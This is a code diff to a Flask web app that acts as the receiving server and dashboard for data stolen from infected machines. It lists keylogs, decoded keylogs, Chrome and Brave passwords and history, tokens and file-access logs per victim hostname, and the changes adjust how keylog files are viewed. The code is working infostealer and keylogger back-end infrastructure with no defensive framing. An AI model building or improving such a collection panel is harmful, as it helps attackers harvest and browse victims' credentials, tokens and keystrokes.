@@ -1,5 +1,5 @@
 import os
-from flask import Flask, request, send_from_directory, render_template_string, send_file
+from flask import Flask, request, send_from_directory, render_template_string, Response
 from werkzeug.utils import secure_filename
 from datetime import datetime
 import pytz
@@ -15,8 +15,6 @@ COLUMNS = [
     "Decoded Keylogs", "Chrome History", "Brave History", "Chrome Passwords",
     "Brave Passwords", "Tokens", "Recent Files", "File Access Log"
 ]
-
-TEXT_VIEW_COLUMNS = ["keylogs", "decoded_keylogs"]  # files to display as plain text
 
 HTML_TEMPLATE = '''
 <!DOCTYPE html>
@@ -53,8 +51,16 @@ HTML_TEMPLATE = '''
         <tr>
           <td>{{ folder.hostname }}</td>
           <td>{{ folder.timestamp }}</td>
-          {% for file, is_text in folder.files %}
-            <td>{% if file %}<a href="{{ file }}" {% if is_text %}target="_blank"{% endif %}>📥 View/Download</a>{% else %}-{% endif %}</td>
+          {% for file in folder.files %}
+            <td>
+              {% if file %}
+                {% if file.endswith('.txt') and ('keylogs' in file or 'decrypted' in file) %}
+                  <a href="{{ file.replace('/download', '/view') }}" target="_blank">👁️ View</a>
+                {% else %}
+                  <a href="{{ file }}" target="_blank">📥 View/Download</a>
+                {% endif %}
+              {% else %}-{% endif %}
+            </td>
           {% endfor %}
         </tr>
       {% endfor %}
@@ -96,17 +102,15 @@ def index():
                             "chrome_history": ["chrome_history", "browser_history"],
                             "desktop_screenshot": ["desktop_screenshot", "screenshot"],
                             "keylogs": ["keylogs", "keylogs_export"],
-                            "decoded_keylogs": ["decoded_keylogs"]
+                            "decoded_keylogs": ["decoded_keylogs", "decrypted_keylogs"]
                         }
                         patterns = alternatives.get(normalized, [normalized])
                         if any(p in f.lower() for p in patterns):
-                            is_text_file = normalized in TEXT_VIEW_COLUMNS
-                            url = f"/view/{folder}/{f}" if is_text_file else f"/download/{folder}/{f}"
-                            row["files"].append((url, is_text_file))
+                            row["files"].append(f"/download/{folder}/{f}")
                             matched = True
                             break
                     if not matched:
-                        row["files"].append((None, False))
+                        row["files"].append(None)
 
                 activity_log_file = next((f for f in os.listdir(full_path) if "activity_log" in f.lower()), None)
                 if activity_log_file:
@@ -138,15 +142,16 @@ def receive():
 
 @app.route("/download/<folder>/<filename>")
 def download(folder, filename):
-    return send_from_directory(os.path.join(UPLOAD_ROOT, folder), filename, as_attachment=True)
+    return send_from_directory(os.path.join(UPLOAD_ROOT, folder), filename)
 
 @app.route("/view/<folder>/<filename>")
-def view_text(folder, filename):
+def view_file(folder, filename):
     try:
-        filepath = os.path.join(UPLOAD_ROOT, folder, filename)
-        return send_file(filepath, mimetype='text/plain')
+        with open(os.path.join(UPLOAD_ROOT, folder, filename), "r", encoding="utf-8") as f:
+            content = f.read()
+        return Response(content, mimetype='text/plain')
     except:
-        return "Failed to load file", 404
+        return "Error reading file"
 
 if __name__ == "__main__":
     app.run(debug=True)
